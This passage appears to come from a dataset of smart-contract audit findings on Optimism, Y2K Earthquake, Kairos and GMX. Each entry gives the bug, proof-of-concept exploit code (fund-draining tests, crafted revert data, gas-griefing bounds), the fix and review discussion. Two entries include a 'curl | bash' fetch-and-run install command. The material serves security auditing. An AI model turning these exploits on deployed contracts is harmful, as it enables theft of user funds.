11_802_831, attack possible messageLength= 1024 kb, HashingGas for v1= 11_754_659, HahingGas for v0= 23_509_318, attack possible\n\nWhich can be calculated approximately by:\n```\nfunction checkGasV1(bytes calldata _message)\n        public\n        view\n        returns (uint256, uint256)\n    {\n        uint256 gas1 = gasleft();\n        bytes32 versionedHash = Hashing.hashCrossDomainMessageV1(\n            0,\n            address(this),\n            address(this),\n            0,\n            0,\n            _message\n        );\n        uint256 gas2 = gasleft();\n        return (_message.length, (gas1 - gas2));\n    }\n```\n\n```\nfunction checkGasV0(bytes calldata _message)\n        public\n        view\n        returns (\n            uint256,\n            uint256,\n            uint256\n        )\n    {\n        uint256 gas1 = gasleft();\n        bytes32 versionedHash1 = Hashing.hashCrossDomainMessageV0(\n            address(this),\n            address(this),\n            _message,\n            0\n        );\n        uint256 gas2 = gasleft();\n        uint256 gas3 = gasleft();\n        bytes32 versionedHash2 = Hashing.hashCrossDomainMessageV1(\n            0,\n            address(this),\n            address(this),\n            0,\n            0,\n            _message\n        );\n        uint256 gas4 = gasleft();\n        return (_message.length, (gas1 - gas2), (gas3 - gas4));\n    }\n```\n\nIt means that if for example the `messageLength` is equal to 684 kb (mostly non-zero, only 42 kb zero), and the message is version 0, and for example the `_minGasLimit` is equal to 21000, an attacker can exploit the user's withdrawal transaction by providing a gas meeting the following condition: `(_minGasLimit * (1016/1000) + 684 * 1024 * 16 ) * (64 / 63) + 253_378 < G < (_minGasLimit * (64 / 63) + 11_802_831) *(64/63) + 101_051` After, replacing the numbers, the provided gas by the attacker should be: `11_659_592 < G < 12_112_900` So, by providing almost 12M gas, it will pass the check in `OptimismPortal`, but it will revert in `L1CrossDomainMessenger` due to OOG, as a result the user's transaction will not be allowed to be replayed.\nPlease note that if there is a long time between request of withdrawal transaction on L2 and finalizing withdrawal transaction on L1, it is possible that the gas price is low enough on L1, so economically reasonable for the attacker to execute it.\nIn Summary:\nWhen calculating the `baseGas` on L2, only the `minGasLimit` and `message.length` are considered, and a hardcoded overhead is also added. While, the hashing mechanism (due to memory expansion) is exponentially related to the length of the message. It means that, the amount of gas usage during relaying the message can be increased to the level that is higher than calculated value in `baseGas`. So, if the length of the message is long enough (to increase the gas significantly due to memory expansion), it provides an attack surface so that the attacker provides the amount of gas that only pass the condition in `OptimismPortal`, but goes out of gas in `L1CrossDomainMessenger`."ч
Funds can be stolen because of incorrect update to `ownerToRollOverQueueIndex` for existing rolloversчhighч```\nif (ownerToRollOverQueueIndex[_receiver] != 0) {\n  // if so, update the queue\n  uint256 index = getRolloverIndex(_receiver);\n  rolloverQueue[index].assets = _assets;\n  rolloverQueue[index].epochId = _epochId;\n```\nчIn the case where the owner has an existing rollover, the `ownerToRollOverQueueIndex` incorrectly updates to the last queue index. This causes the `notRollingOver` check to be performed on the incorrect `_id`, which then allows the depositor to withdraw funds that should've been locked.\nIn `enlistInRollover()`, if the user has an existing rollover, it overwrites the existing data:\n```\nif (ownerToRollOverQueueIndex[_receiver] != 0) {\n  // if so, update the queue\n  uint256 index = getRolloverIndex(_receiver);\n  rolloverQueue[index].assets = _assets;\n  rolloverQueue[index].epochId = _epochId;\n```\n\nHowever, regardless of whether the user has an existing rollover, the `ownerToRolloverQueueIndex` points to the last item in the queue:\n```\nownerToRollOverQueueIndex[_receiver] = rolloverQueue.length;\n```\n\nThus, the `notRollingOver` modifier will check the incorrect item for users with existing rollovers:\n```\nQueueItem memory item = rolloverQueue[getRolloverIndex(_receiver)];\nif (\n    item.epochId == _epochId &&\n    (balanceOf(_receiver, _epochId) - item.assets) < _assets\n) revert AlreadyRollingOver();\n```\n\nallowing the user to withdraw assets that should've been locked.чThe `ownerToRollOverQueueIndex` should be pointing to the last item in the queue in the `else` case only: when the user does not have an existing rollover queue item.\n```\n} else {\n  // if not, add to queue\n  rolloverQueue.push(\n      QueueItem({\n          assets: _assets,\n          receiver: _receiver,\n          epochId: _epochId\n      })\n  );\n// Add the line below\n ownerToRollOverQueueIndex[_receiver] = rolloverQueue.length;\n}\n// Remove the line below\n ownerToRollOverQueueIndex[_receiver] = rolloverQueue.length;\n```\n\nDiscussion\n3xHarry\ngood catch\n3xHarry\nfix PR: https://github.com/Y2K-Finance/Earthquake/pull/128\nIAm0x52\nFix looks good. Assigning index has been moved inside else blockчUsers are able to withdraw assets that should've been locked for rollovers.\nCode Snippet\nTool used\nManual Review
When rolling over, user will lose his winnings from previous epochчhighч```\nrolloverQueue[index].assets = _assets;\n```\nчWhen `mintRollovers` is called, when the function mints shares for the new epoch for the user, the amount of shares minted will be the same as the original assets he requested to rollover - not including the amount he won. After this, all these asset shares from the previous epoch are burnt. So the user won't be able to claim his winnings.\nWhen user requests to `enlistInRollover`, he supplies the amount of assets to rollover, and this is saved in the queue.\n```\nrolloverQueue[index].assets = _assets;\n```\n\nWhen `mintRollovers` is called, the function checks if the user won the previous epoch, and proceeds to burn all the shares the user requested to roll:\n```\n            if (epochResolved[queue[index].epochId]) {\n                uint256 entitledShares = previewWithdraw(\n                    queue[index].epochId,\n                    queue[index].assets\n                );\n                // mint only if user won epoch he is rolling over\n                if (entitledShares > queue[index].assets) {\n                    // rest of code\n                    // @note we know shares were locked up to this point\n                    _burn(\n                        queue[index].receiver,\n                        queue[index].epochId,\n                        queue[index].assets\n                    );\n```\n\nThen, and this is the problem, the function mints to the user his original assets - `assetsToMint` - and not `entitledShares`.\n```\nuint256 assetsToMint = queue[index].assets - relayerFee;\n_mintShares(queue[index].receiver, _epochId, assetsToMint);\n```\n\nSo the user has only rolled his original assets, but since all his share of them is burned, he will not be able anymore to claim his winnings from them.\nNote that if the user had called `withdraw` instead of rolling over, all his shares would be burned, but he would receive his `entitledShares`, and not just his original assets. We can see in this in `withdraw`. Note that `_assets` is burned (like in minting rollover) but `entitledShares` is sent (unlike minting rollover, which only remints _assets.)\n```\n        _burn(_owner, _id, _assets);\n        _burnEmissions(_owner, _id, _assets);\n        uint256 entitledShares;\n        uint256 entitledEmissions = previewEmissionsWithdraw(_id, _assets);\n        if (epochNull[_id] == false) {\n            entitledShares = previewWithdraw(_id, _assets);\n        } else {\n            entitledShares = _assets;\n        }\n        if (entitledShares > 0) {\n            SemiFungibleVault.asset.safeTransfer(_receiver, entitledShares);\n        }\n        if (entitledEmissions > 0) {\n            emissionsToken.safeTransfer(_receiver, entitledEmissions);\n        }\n```\nчEither remint the user his winnings also, or if you don't want to make him roll over the winnings, change the calculation so he can still withdraw his shares of the winnings.\nDiscussion\n3xHarry\nthis makes total sense! thx for catching this!\n3xHarry\nwill have to calculate how much his original deposit is worth in entitledShares and rollover the specified amount\n3xHarry\nfix PR: https://github.com/Y2K-Finance/Earthquake/pull/125\nIAm0x52\nNeeds additional changes. This will revert if diff is too high due to underflow in L412\nIAm0x52\nFix looks good. Point of underflow has been removed in a subsequent PR\njacksanford1\nNote: Subsequent PR 0x52 is referencing refers to this commit:\nhttps://github.com/Y2K-Finance/Earthquake/pull/125/commits/3732a7075348e87da612166dd060bfd8dd742ecbчUser will lose his rewards when rolling over.\nCode Snippet\n```\n            if (epochResolved[queue[index].epochId]) {\n                uint256 entitledShares = previewWithdraw(\n                    queue[index].epochId,\n                    queue[index].assets\n                );\n                // mint only if user won epoch he is rolling over\n                if (entitledShares > queue[index].assets) {\n                    // rest of code\n                    // @note we know shares were locked up to this point\n                    _burn(\n                        queue[index].receiver,\n                        queue[index].epochId,\n                        queue[index].assets\n                    );\n```\n\nTool used\nManual Review
User deposit may never be entertained from deposit queueчmediumч```\n while ((length - _operations) <= i) {\n            // this loop impelements FILO (first in last out) stack to reduce gas cost and improve code readability\n            // changing it to FIFO (first in first out) would require more code changes and would be more expensive\n            _mintShares(\n                queue[i].receiver,\n                _epochId,\n                queue[i].assets - relayerFee\n            );\n            emit Deposit(\n                msg.sender,\n                queue[i].receiver,\n                _epochId,\n                queue[i].assets - relayerFee\n            );\n            depositQueue.pop();\n            if (i == 0) break;\n            unchecked {\n                i--;\n            }\n        }\n```\nчDue to FILO (first in last out) stack structure, while dequeuing, the first few entries may never be retrieved. These means User deposit may never be entertained from deposit queue if there are too many deposits\nAssume User A made a deposit which becomes 1st entry in `depositQueue`\nPost this X more deposits were made, so `depositQueue.length=X+1`\nRelayer calls `mintDepositInQueue` and process `X-9` deposits\n```\n while ((length - _operations) <= i) {\n            // this loop impelements FILO (first in last out) stack to reduce gas cost and improve code readability\n            // changing it to FIFO (first in first out) would require more code changes and would be more expensive\n            _mintShares(\n                queue[i].receiver,\n                _epochId,\n                queue[i].assets - relayerFee\n            );\n            emit Deposit(\n                msg.sender,\n                queue[i].receiver,\n                _epochId,\n                queue[i].assets - relayerFee\n            );\n            depositQueue.pop();\n            if (i == 0) break;\n            unchecked {\n                i--;\n            }\n        }\n```\n\nThis reduces deposit queue to only 10\nBefore relayer could process these, Y more deposits were made which increases deposit queue to `y+10`\nThis means Relayer might not be able to again process User A deposit as this deposit is lying after processing `Y+9` depositsч
changeTreasury() Lack of check and remove oldчmediumч```\n    function changeTreasury(uint256 _marketId, address _treasury)\n        public\n        onlyTimeLocker\n    {\n        if (_treasury == address(0)) revert AddressZero();\n\n        address[2] memory vaults = marketIdToVaults[_marketId];\n\n        if (vaults[0] == address(0) || vaults[1] == address(0)) {\n            revert MarketDoesNotExist(_marketId);\n        }\n        IVaultV2(vaults[0]).whiteListAddress(_treasury);\n        IVaultV2(vaults[1]).whiteListAddress(_treasury);\n        IVaultV2(vaults[0]).setTreasury(treasury);\n        IVaultV2(vaults[1]).setTreasury(treasury);\n\n        emit AddressWhitelisted(_treasury, _marketId);\n    }\n```\nчchangeTreasury() Lack of check and remove old\nchangeTreasury() used to set new treasury The code is as follows：\n```\n    function changeTreasury(uint256 _marketId, address _treasury)\n        public\n        onlyTimeLocker\n    {\n        if (_treasury == address(0)) revert AddressZero();\n\n        address[2] memory vaults = marketIdToVaults[_marketId];\n\n        if (vaults[0] == address(0) || vaults[1] == address(0)) {\n            revert MarketDoesNotExist(_marketId);\n        }\n        IVaultV2(vaults[0]).whiteListAddress(_treasury);\n        IVaultV2(vaults[1]).whiteListAddress(_treasury);\n        IVaultV2(vaults[0]).setTreasury(treasury);\n        IVaultV2(vaults[1]).setTreasury(treasury);\n\n        emit AddressWhitelisted(_treasury, _marketId);\n    }\n```\n\nThe above code has the following problem:\nno check whether the new treasury same as the old. If it is the same, the whitelist will be canceled.\nUse setTreasury(VaultFactoryV2.treasury), it should be setTreasury(_treasury)\nnot cancel old treasury from the whitelistч"```\n    function changeTreasury(uint256 _marketId, address _treasury)\n        public\n        onlyTimeLocker\n    {\n        if (_treasury == address(0)) revert AddressZero();\n\n        address[2] memory vaults = marketIdToVaults[_marketId];\n\n        if (vaults[0] == address(0) || vaults[1] == address(0)) {\n            revert MarketDoesNotExist(_marketId);\n        }\n\n+       require(vaults[0].treasury() !=_treasury,""same""); //check same\n+       IVaultV2(vaults[0]).whiteListAddress(vaults[0].treasury()); //cancel old whitelist\n+       IVaultV2(vaults[1]).whiteListAddress(vaults[1].treasury()); //cancel old whitelist\n\n        IVaultV2(vaults[0]).whiteListAddress(_treasury);\n        IVaultV2(vaults[1]).whiteListAddress(_treasury);\n+       IVaultV2(vaults[0]).setTreasury(_treasury);\n+       IVaultV2(vaults[1]).setTreasury(_treasury);\n-       IVaultV2(vaults[0]).setTreasury(treasury);\n-       IVaultV2(vaults[1]).setTreasury(treasury);\n\n        emit AddressWhitelisted(_treasury, _marketId);\n    }\n```\n\nDiscussion\ndmitriia\nKeeping it separate from 435 because of whitelist observation (1)\npauliax\nEscalate for 10 USDC.\nI believe it is unfair to leave it as a solo medium.\n#410 also mentions the problem with whitelisting: ""Also, probably the old treasury should be removed from the whitelist to prevent accidental abuse of privileges."" but was grouped together with other issues from #435.\nsherlock-admin\nEscalate for 10 USDC.\nI believe it is unfair to leave it as a solo medium.\n#410 also mentions the problem with whitelisting: ""Also, probably the old treasury should be removed from the whitelist to prevent accidental abuse of privileges."" but was grouped together with other issues from #435.\nYou've created a valid escalation for 10 USDC!\nTo remove the escalation from consideration: Delete your comment.\nYou may delete or edit your escalation comment anytime before the 48-hour escalation window closes. After that, the escalation becomes final.\n3xHarry\nfix Pr: https://github.com/Y2K-Finance/Earthquake/pull/137\nhrishibhat\nEscalation accepted\nAdded relevant duplicates based on whitelist observation\nsherlock-admin\nEscalation accepted\nAdded relevant duplicates based on whitelist observation\nThis issue's escalations have been accepted!\nContestants' payouts and scores will be updated according to the changes made on this issue.\nIAm0x52\nFixes look good. Carousel now directly uses the treasury address sent on factory"чwhiteListAddress abnormal\nCode Snippet\nTool used\nManual Review
mintRollovers should require entitledShares >= relayerFeeчmediumч```\n                if (entitledShares > queue[index].assets) {\n                    // skip the rollover for the user if the assets cannot cover the relayer fee instead of revert.\n                    if (queue[index].assets < relayerFee) {\n                        index++;\n                        continue;\n                    }\n```\nчmintRollovers should require entitledShares >= relayerFee\nIn mintRollovers, the rollover is only not skipped if queue[index].assets >= relayerFee,\n```\n                if (entitledShares > queue[index].assets) {\n                    // skip the rollover for the user if the assets cannot cover the relayer fee instead of revert.\n                    if (queue[index].assets < relayerFee) {\n                        index++;\n                        continue;\n                    }\n```\n\nIn fact, since the user is already profitable, entitledShares is the number of assets of the user, which is greater than queue[index].assets, so it should check that entitledShares >= relayerFee, and use entitledShares instead of queue[index].assets to subtract relayerFee when calculating assetsToMint later.чChange to\n```\n                if (entitledShares > queue[index].assets) {\n                    // skip the rollover for the user if the assets cannot cover the relayer fee instead of revert.\n// Remove the line below\n                   if (queue[index].assets < relayerFee) {\n// Add the line below\n                   if (entitledShares < relayerFee) {\n                        index// Add the line below\n// Add the line below\n;\n                        continue;\n                    }\n// rest of code\n// Remove the line below\n                   uint256 assetsToMint = queue[index].assets // Remove the line below\n relayerFee;\n// Add the line below\n                   uint256 assetsToMint = entitledShares // Remove the line below\n relayerFee;\n```\n\nDiscussion\n3xHarry\nfix PR: https://github.com/Y2K-Finance/Earthquake/pull/136\nIAm0x52\nNeeds additional changes. L423 doesn't make sense to me. queue[index].assets is in shares and entitledAmount isn't but they are subtracted directly.\n3xHarry\n@IAm0x52 thx for your comment, basically since `QueueItem.asset` (later renamed to shares) represents share of the epoch, i converted `relayerFee` which is denominated in underlying asset to `shares` for that epoch. Later i realized that Users only want to rollover their original deposit value, therefore i burn the original deposit Value and mint this value - relayerFeeInShares into the next epoch, the winnings sahres amount are left in the epoch to be withdrawn\njacksanford1\nBringing in some Discord discussion:\n0x52\nFor 293 your comment then conflicts with how you take the fee because you're charging the user the relayer fee for epoch n+1 but you're using epoch n to estimate. You should just take the fee directly not convert it into shares\n3xHarry\n@0x52 thx for raising this concern: uint256 relayerFeeInShares = previewAmountInShares(queue[index].epochId, relayerFee); converts relayerFee into amount of shares of prev epoch (epoch users wants to rollover collateral from)\nuint256 assetsToMint = queue[index].assets - relayerFeeInShares; assets represent shares in prev epoch and arrimetic operation is done in same denominator (shares in queue[index].epochId)\n0x52\nShares and assets are 1:1 for the open epoch correct?\nSo imagine this scenario. You deposit 100 asset into epoch 1 to get 100 shares in epoch 1. Now you queue them into the rollover.\nEpoch 1 ends with a profit of 25% which means your 100 shares are now worth 125. 80 shares are burned (worth 100 assets) leaving the user with 20 shares for epoch 1.\nIf the relayer fee is 10 then it will be converted to 8 shares of epoch 2. But epoch 2 is still 1:1 with assets so it's only taking 8 assets from the user but sending them 10 asset as the relayer fee So you either need to reduce epoch 1 shares by 8 (i.e. leave the user with 12 shares) or you need to reduce assetsToMint by relayer fee directly (i.e. only mint 90 to epoch 2)\njacksanford1\nBringing in some discussion from Y2K's repo:\n3xHarry\n@IAm0x52 thx for noticing the relayerFeeInShares Bug I will close this PR, but fix can be observed in 9165674\nhttps://github.com/Y2K-Finance/Earthquake/pull/136#issuecomment-1541996529\nIAm0x52\nFix looks good. Fee is no longer converted since epoch in which fee is removed is always 1:1чThis will prevent rollover even if the user has more assets than relayerFee\nCode Snippet\nTool used\nManual Review
Denial-of-Service in the liquidation flow results in the collateral NTF will be stuck in the contract.чmediumч"```\nfunction testBorrowOverflow() public {\n    uint256 borrowAmount = 1e40;\n    BorrowArg[] memory borrowArgs = new BorrowArg[](1);\n    (, ,uint256 loanId , ) = kairos.getParameters();\n    loanId += 1;\n\n    Offer memory offer = Offer({\n            assetToLend: money,\n            loanToValue: 1e61,\n            duration: 1,\n            expirationDate: block.timestamp + 2 hours,\n            tranche: 0,\n            collateral: getNft()\n        });\n    uint256 currentTokenId;\n\n    getFlooz(signer, money, getOfferArg(offer).amount);\n\n    {\n        OfferArg[] memory offerArgs = new OfferArg[](1);\n        currentTokenId = getJpeg(BORROWER, nft);\n        offer.collateral.id = currentTokenId;\n        offerArgs[0] = OfferArg({\n            signature: getSignature(offer),\n            amount: borrowAmount,\n            offer: offer\n        });\n        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});\n    }\n\n    vm.prank(BORROWER);\n    kairos.borrow(borrowArgs);\n\n    assertEq(nft.balanceOf(BORROWER), 0);\n    assertEq(money.balanceOf(BORROWER), borrowAmount);\n    assertEq(nft.balanceOf(address(kairos)), 1);\n\n    vm.warp(block.timestamp + 1);\n    Loan memory loan = kairos.getLoan(loanId);\n    console.log(""price of loanId"", kairos.price(loanId));\n}\n```\n"ч"If the `loanTovalue` value of the offer is extremely high, the liquidation flow will be reverted, causing the collateral NTF to persist in the contract forever.\nThe platform allows users to sign offers and provide funds to those who need to borrow assets.\nIn the first scenario, the lender provided an offer that the `loanTovalue` as high as the result of the `shareMatched` is `0`. For example, if the borrowed amount was `1e40` and the offer had a `loanTovalue` equal to `1e68`, the share would be `0`.\nAs a result, an arithmetic error (Division or modulo by 0) will occur in the `price()` function at line 50 during the liquidation process.\nIn the second scenario, if the lender's share exceeds `0`, but the offer's `loanToValue` is extremely high, the `price()` function at line 54 may encounter an arithmetic error(Arithmetic over/underflow) during the `estimatedValue` calculation.\nPoof of Concept\n```\nfunction testBorrowOverflow() public {\n    uint256 borrowAmount = 1e40;\n    BorrowArg[] memory borrowArgs = new BorrowArg[](1);\n    (, ,uint256 loanId , ) = kairos.getParameters();\n    loanId += 1;\n\n    Offer memory offer = Offer({\n            assetToLend: money,\n            loanToValue: 1e61,\n            duration: 1,\n            expirationDate: block.timestamp + 2 hours,\n            tranche: 0,\n            collateral: getNft()\n        });\n    uint256 currentTokenId;\n\n    getFlooz(signer, money, getOfferArg(offer).amount);\n\n    {\n        OfferArg[] memory offerArgs = new OfferArg[](1);\n        currentTokenId = getJpeg(BORROWER, nft);\n        offer.collateral.id = currentTokenId;\n        offerArgs[0] = OfferArg({\n            signature: getSignature(offer),\n            amount: borrowAmount,\n            offer: offer\n        });\n        borrowArgs[0] = BorrowArg({nft: NFToken({id: currentTokenId, implem: nft}), args: offerArgs});\n    }\n\n    vm.prank(BORROWER);\n    kairos.borrow(borrowArgs);\n\n    assertEq(nft.balanceOf(BORROWER), 0);\n    assertEq(money.balanceOf(BORROWER), borrowAmount);\n    assertEq(nft.balanceOf(address(kairos)), 1);\n\n    vm.warp(block.timestamp + 1);\n    Loan memory loan = kairos.getLoan(loanId);\n    console.log(""price of loanId"", kairos.price(loanId));\n}\n```\n"ч
Incomplete error handling causes execution and freezing/cancelling of Deposits/Withdrawals/Orders to fail.чhighч```\ntry IDepositCallbackReceiver(deposit.callbackContract()).afterDepositExecution{ gas: deposit.callbackGasLimit() }(key, deposit) {\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n            emit AfterDepositExecutionError(key, deposit, reason, reasonBytes);\n        }\n```\nчUsers can define callbacks for Deposits/Withdrawals/Orders execution and cancellations. GMX protocol attempts to manage errors during the execution of the callbacks\nA user controlled callback can return a specially crafted revert reason that will make the error handling revert.\nBy making the execution and cancelation revert, a malicious actor can game orders and waste keeper gas.\nThe bug resides in ErrorUtilss `getRevertMessage` that is called on every callback attempt. Example of deposit callback:\n```\ntry IDepositCallbackReceiver(deposit.callbackContract()).afterDepositExecution{ gas: deposit.callbackGasLimit() }(key, deposit) {\n        } catch (bytes memory reasonBytes) {\n            (string memory reason, /* bool hasRevertMessage */) = ErrorUtils.getRevertMessage(reasonBytes);\n            emit AfterDepositExecutionError(key, deposit, reason, reasonBytes);\n        }\n```\n\nAs can be seen in the above above snippets, the `reasonBytes` from the catch statement is passed to `getRevertMessage` which tries to extract the `Error(string)` message from the revert. The issue is that the data extracted from the revert can be crafted to revert on `abi.decode`.\nI will elaborate: Correct (expected) revert data looks as follows: 1st 32 bytes: 0x000..64 (bytes memory size) 2nd 32 bytes: 0x08c379a0 (Error(string) selector) 3rd 32 bytes: offset to data 4th 32 bytes: length of data 5th 32 bytes: data\n`abi.decode` reverts if the data is not structure correctly. There can be two reasons for revert:\nif the 3rd 32 bytes (offset to data) is larger then the uint64 (0xffffffffffffffff)\nSimplified yul: `if gt(offset, 0xffffffffffffffff) { revert }`\nif the 3rd 32 bytes (offset to data) is larger then the uint64 of the encoded data, the call will revert\nSimplieifed yul: `if iszero(slt(add(offset, 0x1f), size) { revert }`\nBy reverting with the following data in the callback, the `getRevertMessage` will revert: 0x000....64 0x0x08c379a0...000 0xffffffffffffffff....000 0x000...2 0x4141чWhen parsing the revert reason, validate the offsets are smaller then the length of the encoding.\nDiscussion\nxvi10\nFix in https://github.com/gmx-io/gmx-synthetics/commit/b0bac262191f4f96edc9606192d2e4abfa043dc3ч"There are two impacts will occur when the error handling reverts:\n(1) Orders can be gamed\nSince the following callbacks are controlled by the user,:\n`afterOrderExecution`\n`afterOrderCancellation`\n`afterOrderFrozen`\nThe user can decide when to send the malformed revert data and when not. Essentially preventing keepers from freezing orders and from executing orders until it fits the attacker.\nThere are two ways to game the orders:\nAn attacker can create a risk free order, by setting a long increase order. If the market increases in his favor, he can decide to ""unblock"" the execution and receive profit. If the market decreases, he can cancel the order or wait for the right timing.\nAn attacker can create a limit order with a size larger then what is available in the pool. The attacker waits for the price to hit and then deposit into the pool to make the transaction work. This method is supposed to be prevented by freezing orders, but since the attacker can make the `freezeOrder` revert, the scenario becomes vulnerable again.\n(2) drain keepers funds\nSince exploiting the bug for both execution and cancellation, keepers will ALWAYS revert when trying to execute Deposits/Withdrawals/Orders. The protocol promises to always pay keepers at-least the execution cost. By making the execution and cancellations revert the Deposits/Withdrawals/Orders will never be removed from the store and keepers transactions will keep reverting until potentially all their funds are wasted.\nCode Snippet\nI have constructed an end-to-end POC in foundry.\nTo get it running, first install foundry using the following command:\n`curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)\nIf local node is not already running and contracts are not deployed, configured and funded - execute the following:\n```\nnpx hardhat node\n```\n\n3 Perform the following set of commands from the repository root.\n```\nrm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit\n```\n\nexecute `forge test --fork-url=""http://127.0.0.1:8545"" -v -m testNoneExecutableDeposits`\nTool used\nVS Code, Foundry"
Keeper can make deposits/orders/withdrawals fail and receive fee+rewardsчmediumч```\nfunction executeDeposit(\n        bytes32 key,\n        OracleUtils.SetPricesParams calldata oracleParams\n    ) external\n        globalNonReentrant\n        onlyOrderKeeper\n        withOraclePrices(oracle, dataStore, eventEmitter, oracleParams)\n    {\n        uint256 startingGas = gasleft();\n\n        try this._executeDeposit(\n            key,\n            oracleParams,\n            msg.sender,\n            startingGas\n        ) {\n        } catch (bytes memory reasonBytes) {\n            _handleDepositError(\n                key,\n                startingGas,\n                reasonBytes\n            );\n        }\n    }\n```\nчMalicious keeper can make execution of deposits/orders/withdrawals fail by providing limited gas to the execution.\nIf enough gas is sent for the cancellation to succeed but for the execution to fail the keeper is able to receive the execution fee + incentive rewards and cancel all deposits/orders/withdrawals.\n```\nfunction executeDeposit(\n        bytes32 key,\n        OracleUtils.SetPricesParams calldata oracleParams\n    ) external\n        globalNonReentrant\n        onlyOrderKeeper\n        withOraclePrices(oracle, dataStore, eventEmitter, oracleParams)\n    {\n        uint256 startingGas = gasleft();\n\n        try this._executeDeposit(\n            key,\n            oracleParams,\n            msg.sender,\n            startingGas\n        ) {\n        } catch (bytes memory reasonBytes) {\n            _handleDepositError(\n                key,\n                startingGas,\n                reasonBytes\n            );\n        }\n    }\n```\n\nFor the attack to succeed, the keeper needs to make `this._executeDeposit` revert. Due to the 64/63 rule the attack will succeed if both of the following conditions meet:\n63/64 of the supplied gas will cause an out of gas in the `try` statement\n1/64 of the supplied gas is enough to execute the `catch` statement.\nConsidering `2000000` is the max callback limit and native token transfer gas limit is large enough to support contracts the above conditions can be met.\nI created a POC that exploits the vulnerability on deposits. Keep in mind that it might be easier (lower limits) for Orders as more logic is performed in the `try` statement and therefore more gas is supplied. See in the `Code Snippet` sectionчAdd a buffer of gas that needs to be supplied to the execute function to make sure the `try` statement will not revert because of out of gas.\nDiscussion\nxvi10\nThis is a valid issue but the risk of a keeper intentionally doing this should be low as there is not much benefit aside from possibly slightly higher execution fees received, a keeper network can help to reduce the risk of this and malicious keepers may be removed\nxvi10\nIt is possible to introduce a minimum gas limit but it may be difficult to manage this such that it closely matches the actual gas required while remaining below the maximum block gas limit\nAllowing keepers to accurately estimate the gas limit off-chain may allow transactions to be executed faster as the transaction can more easily be included in blocksч"Keeper can remove all deposits/withdrawals/orders from the protocol.\nEssentially stealing all execution fees paid\nKeeper can create deposits and by leveraging the bug can cancel them when executing while receiving rewards.\nVaults will be drained\nCode Snippet\nTo get it running, first install foundry using the following command:\n`curl -L https://foundry.paradigm.xyz | bash` (from https://book.getfoundry.sh/getting-started/installation#install-the-latest-release-by-using-foundryup)\nIf local node is not already running and contracts are not deployed, configured - execute the following:\n```\nnpx hardhat node\n```\n\n3 Perform the following set of commands from the repository root.\n```\nrm -rf foundry; foundryup; mkdir foundry; cd foundry; forge init --no-commit\n```\n\nexecute `forge test --fork-url=""http://127.0.0.1:8545"" -v -m ""testCreateDepositAndCancel""`\nTool used\nVS Code, foundry"
WNT in depositVault can be drained by abusing initialLongToken/initialShortToken of CreateDepositParamsчhighч```\n    function createDeposit(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        DepositVault depositVault,\n        address account,\n        CreateDepositParams memory params\n    ) external returns (bytes32) {\n        Market.Props memory market = MarketUtils.getEnabledMarket(dataStore, params.market);\n\n        uint256 initialLongTokenAmount = depositVault.recordTransferIn(params.initialLongToken);\n        uint256 initialShortTokenAmount = depositVault.recordTransferIn(params.initialShortToken);\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        if (market.longToken == wnt) {\n            initialLongTokenAmount -= params.executionFee;\n        } else if (market.shortToken == wnt) {\n            initialShortTokenAmount -= params.executionFee;\n```\nч"The attacker can abuse the initialLongToken/initialShortToken of `CreateDepositParams` to drain all the WNT from depositVault.\n```\n    function createDeposit(\n        DataStore dataStore,\n        EventEmitter eventEmitter,\n        DepositVault depositVault,\n        address account,\n        CreateDepositParams memory params\n    ) external returns (bytes32) {\n        Market.Props memory market = MarketUtils.getEnabledMarket(dataStore, params.market);\n\n        uint256 initialLongTokenAmount = depositVault.recordTransferIn(params.initialLongToken);\n        uint256 initialShortTokenAmount = depositVault.recordTransferIn(params.initialShortToken);\n\n        address wnt = TokenUtils.wnt(dataStore);\n\n        if (market.longToken == wnt) {\n            initialLongTokenAmount -= params.executionFee;\n        } else if (market.shortToken == wnt) {\n            initialShortTokenAmount -= params.executionFee;\n```\n\nThe `initialLongToken` and `initialShortToken` of `CreateDepositParams` can be set to any token address and there is no check for the `initialLongToken` and `initialShortToken` during `createDeposit`. The attacker can set initialLongToken/initialShortToken to a token(USDC e.g.) with less value per unit than WNT and for a market with `market.longToken == wnt` or `market.shortToken == wnt`, `params.executionFee` will be wrongly subtracted from `initialLongTokenAmount` or `initialLongTokenAmount`. This allows the attacker to have a controllable large `params.executionFee` by sending tokens with less value. By calling `cancelDeposit`, `params.executionFee` amount of WNT will be repaid to the attacker.\nHere is a PoC test case that drains WNT from depositVault:\n```\ndiff --git a/gmx-synthetics/test/router/ExchangeRouter.ts b/gmx-synthetics/test/router/ExchangeRouter.ts\nindex 7eca238..c40a71c 100644\n--- a/gmx-synthetics/test/router/ExchangeRouter.ts\n// Add the line below\n// Add the line below\n// Add the line below\n b/gmx-synthetics/test/router/ExchangeRouter.ts\n@@ -103,6 // Add the line below\n103,82 @@ describe(""ExchangeRouter"", () => {\n     });\n   });\n \n// Add the line below\n  it(""createDepositPoC"", async () => {\n// Add the line below\n    // simulate normal user deposit\n// Add the line below\n    await usdc.mint(user0.address, expandDecimals(50 * 1000, 6));\n// Add the line below\n    await usdc.connect(user0).approve(router.address, expandDecimals(50 * 1000, 6));\n// Add the line below\n    const tx = await exchangeRouter.connect(user0).multicall(\n// Add the line below\n      [\n// Add the line below\n        exchangeRouter.interface.encodeFunctionData(""sendWnt"", [depositVault.address, expandDecimals(11, 18)]),\n// Add the line below\n        exchangeRouter.interface.encodeFunctionData(""sendTokens"", [\n// Add the line below\n          usdc.address,\n// Add the line below\n          depositVault.address,\n// Add the line below\n          expandDecimals(50 * 1000, 6),\n// Add the line below\n        ]),\n// Add the line below\n        exchangeRouter.interface.encodeFunctionData(""createDeposit"", [\n// Add the line below\n          {\n// Add the line below\n            receiver: user0.address,\n// Add the line below\n            callbackContract: user2.address,\n// Add the line below\n            market: ethUsdMarket.marketToken,\n// Add the line below\n            initialLongToken: ethUsdMarket.longToken,\n// Add the line below\n            initialShortToken: ethUsdMarket.shortToken,\n// Add the line below\n            longTokenSwapPath: [ethUsdMarket.marketToken, ethUsdSpotOnlyMarket.marketToken],\n// Add the line below\n            shortTokenSwapPath: [ethUsdSpotOnlyMarket.marketToken, 